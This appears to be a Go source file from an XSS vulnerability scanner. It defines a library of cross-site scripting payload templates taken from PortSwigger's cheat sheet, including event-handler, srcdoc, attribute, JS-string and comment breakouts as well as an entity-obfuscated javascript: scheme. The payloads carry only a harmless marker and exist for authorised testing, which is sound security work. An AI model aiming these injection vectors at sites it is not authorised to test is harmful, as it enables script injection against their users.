package detection

// The cheat-sheet library: vector families the canonical planner does not carry.
//
// Source: PortSwigger's XSS cheat sheet
// (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet,
// 2026 edition). The sheet groups vectors by the mechanism that makes the
// browser run them; this table carries one entry per FAMILY, not every
// obfuscation of it. Obfuscation belongs to the evasion pack (evasion.go),
// which is a separate, operator-gated layer.
//
// Why a family and not a catalogue: a scan pays for every candidate with a
// request. Sending 700 sheet vectors one by one is the behaviour this design
// exists to avoid. Each entry therefore declares:
//
//   - Contexts: where it can land. A vector for element content is never
//     planned at a JS-string site.
//   - Needs: the metacharacters it cannot work without. If the target provably
//     encodes one of them at this site (survives() in candidate.go), the entry
//     is dropped BEFORE a request is spent — that is the "certain responses
//     rule this family out" rule, applied per character.
//   - Trigger: load vs interaction. Load-triggering families run first because
//     they need no verifier action; interaction families only run when the
//     load families at that site have been tried.
//
// The table is a data source, not a second planner: PlanCandidates still
// decides what is planned, the profile still caps how many are sent, and only a
// browser execution signal still confirms a finding.
//
// Every payload carries the benign marker as a bare identifier: when the
// handler fires, the browser resolves it, throws ReferenceError, and the
// verifier sees the signal. No alert()/prompt()/confirm(), no network, no
// cookie access.

import "fmt"

// LibraryVector is one cheat-sheet family, expressed as a template.
type LibraryVector struct {
	// ID names the family (used in rationale text and tests).
	ID string
	// Contexts lists the reflection contexts this vector can be carried in.
	Contexts []Context
	// Trigger is TriggerLoad or TriggerInteraction.
	Trigger string
	// Needs is the set of characters the vector cannot work without.
	Needs string
	// Build produces the payload with the marker embedded.
	Build func(marker string) string
	// Why explains the mechanism in one line.
	Why string
}

// Library is the cheat-sheet family table. Add entries here, not to the
// planner, and only for families the canonical set (candidate.go) does NOT
// already carry: a duplicate would spend a request on a shape the planner
// already sent.
var Library = []LibraryVector{
	// ---- HTML element content, fires on load ------------------------------
	// Families whose tag the canonical planner already carries (svg, details,
	// input, select, textarea, body, img, script, a) are NOT repeated here:
	// that shape is already sent, and a duplicate spends a request.
	{
		ID: "object_data_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<object data=x onerror=%s>`, m) },
		Why:   "an object with an unreachable data URL fires onerror while loading",
	},
	{
		ID: "embed_src_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<embed src=x onerror=%s>`, m) },
		Why:   "the embed element reports a failed load through onerror",
	},
	{
		ID: "iframe_srcdoc", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: `<>="`,
		Build: func(m string) string { return fmt.Sprintf(`<iframe srcdoc="<audio src=x onerror=%s>"></iframe>`, m) },
		Why:   "srcdoc is parsed as its own document, so the inner handler runs on load",
	},
	{
		ID: "iframe_srcdoc_svg", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: `<>="`,
		Build: func(m string) string { return fmt.Sprintf(`<iframe srcdoc="<svg onload=%s>"></iframe>`, m) },
		Why:   "the same nested-document trick with an SVG root instead of audio",
	},
	{
		ID: "noscript_title_breakout", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: `<>="`,
		Build: func(m string) string {
			return fmt.Sprintf(`<noscript><p title="</noscript><img src=x onerror=%s>">`, m)
		},
		Why: "the parser closes noscript at the title's markup, exposing the img",
	},
	{
		ID: "video_source_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<video><source onerror=%s>`, m) },
		Why:   "a video source that fails to load fires the handler without interaction",
	},
	{
		ID: "audio_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<audio src=x onerror=%s>`, m) },
		Why:   "a media element with an unreachable source fires onerror while loading",
	},
	{
		ID: "marquee_onstart", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<marquee onstart=%s>`, m) },
		Why:   "marquee fires onstart while parsing, before any interaction",
	},

	// ---- HTML element content, needs one interaction ----------------------
	{
		ID: "form_action_jsurl", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<form action=javascript:%s><input type=submit>`, m) },
		Why:   "a submitted form navigates to the javascript: action; needs the verifier's click",
	},
	{
		ID: "button_formaction_jsurl", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "<=>",
		Build: func(m string) string { return fmt.Sprintf(`<button formaction=javascript:%s>x</button>`, m) },
		Why:   "formaction overrides the form target for the submit; needs the verifier's click",
	},
	{
		ID: "area_javascript_href", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "<=>,",
		Build: func(m string) string {
			return fmt.Sprintf(`<map><area href=javascript:%s shape=rect coords=0,0,9,9></map>`, m)
		},
		Why: "an image map area carries the same javascript: navigation",
	},

	// ---- HTML attribute value ---------------------------------------------
	{
		ID: "attr_dq_onmouseover", Contexts: []Context{CtxHTMLAttrValue}, Trigger: TriggerInteraction, Needs: `"=`,
		Build: func(m string) string { return fmt.Sprintf(`" onmouseover=%s x="`, m) },
		Why:   "closes a double-quoted value and adds a handler that fires on hover",
	},
	{
		ID: "attr_sq_onmouseover", Contexts: []Context{CtxHTMLAttrValue}, Trigger: TriggerInteraction, Needs: `'=`,
		Build: func(m string) string { return fmt.Sprintf(`' onmouseover=%s x='`, m) },
		Why:   "the same breakout for a single-quoted value",
	},
	{
		ID: "attr_unquoted_onmouseover", Contexts: []Context{CtxHTMLAttrValue}, Trigger: TriggerInteraction, Needs: `= `,
		Build: func(m string) string { return fmt.Sprintf(` onmouseover=%s a=`, m) },
		Why:   "an unquoted value needs no quote at all: a space ends the value",
	},
	{
		ID: "attr_dq_focus", Contexts: []Context{CtxHTMLAttrValue}, Trigger: TriggerLoad, Needs: `"<=>`,
		Build: func(m string) string { return fmt.Sprintf(`"><input autofocus onfocus=%s x="`, m) },
		Why:   "closes the value and the tag, then autofocus fires the handler on load",
	},

	// ---- JavaScript string -------------------------------------------------
	{
		ID: "js_string_sq_break", Contexts: []Context{CtxJSString}, Trigger: TriggerLoad, Needs: `'`,
		Build: func(m string) string { return fmt.Sprintf(`';%s//`, m) },
		Why:   "closes the string and evaluates the marker as code; the comment eats the rest",
	},
	{
		ID: "js_string_dq_break", Contexts: []Context{CtxJSString}, Trigger: TriggerLoad, Needs: `"`,
		Build: func(m string) string { return fmt.Sprintf(`";%s//`, m) },
		Why:   "the same string breakout when the literal is double-quoted",
	},
	{
		ID: "js_string_script_breakout", Contexts: []Context{CtxJSString}, Trigger: TriggerLoad, Needs: "</>=",
		Build: func(m string) string { return fmt.Sprintf(`</script><svg onload=%s>`, m) },
		Why:   "closes the script element itself, so a new SVG runs outside the string",
	},

	// ---- JavaScript code ---------------------------------------------------
	{
		ID: "js_code_marker", Contexts: []Context{CtxJSCode}, Trigger: TriggerLoad, Needs: "",
		Build: func(m string) string { return fmt.Sprintf(`;%s//`, m) },
		Why:   "the reflection is already code, so the marker is a bare expression",
	},

	// ---- URL-valued attribute / javascript: URL ----------------------------
	{
		ID: "url_javascript", Contexts: []Context{CtxURL}, Trigger: TriggerInteraction, Needs: "",
		Build: func(m string) string { return fmt.Sprintf(`javascript:%s`, m) },
		Why:   "the attribute already holds a URL, so the scheme is the whole payload",
	},
	{
		ID: "url_javascript_entities", Contexts: []Context{CtxURL}, Trigger: TriggerInteraction, Needs: "&;",
		Build: func(m string) string { return fmt.Sprintf(`java&#x73;cript:%s`, m) },
		Why:   "a character-reference scheme survives filters that grep for javascript:",
	},

	// ---- HTML comment ------------------------------------------------------
	{
		ID: "comment_breakout", Contexts: []Context{CtxHTMLComment}, Trigger: TriggerLoad, Needs: "<>-=",
		Build: func(m string) string { return fmt.Sprintf(`--><svg onload=%s>`, m) },
		Why:   "closes the comment and puts executable markup where the parser resumes",
	},
}

// libraryTemplatesFor returns the library families that can land in this
// context, as ordinary candidate templates (so the profile, ordering and
// verification paths treat them exactly like the canonical set).
func libraryTemplatesFor(a ContextAnalysis, m string) []candTemplate {
	var out []candTemplate
	for _, v := range Library {
		if !vectorFitsContext(v, a.Context) {
			continue
		}
		// Below every canonical candidate: the library is a TOP-UP, so a
		// profile that caps candidates (minimal 3, standard 8) still spends
		// its budget on the canonical set first and reaches the library only
		// when the operator asked for it (typically with -candidate-profile
		// thorough).
		priority := 40
		if v.Trigger == TriggerInteraction {
			priority = 45
		}
		build := v.Build
		value := build(m)
		out = append(out, candTemplate{
			value:     value,
			needs:     v.Needs,
			priority:  priority,
			rationale: "library/" + v.ID + ": " + v.Why,
			trigger:   v.Trigger,
			strict:    false,
		})
	}
	return out
}

func vectorFitsContext(v LibraryVector, c Context) bool {
	for _, want := range v.Contexts {
		if want == c {
			return true
		}
	}
	return false
}
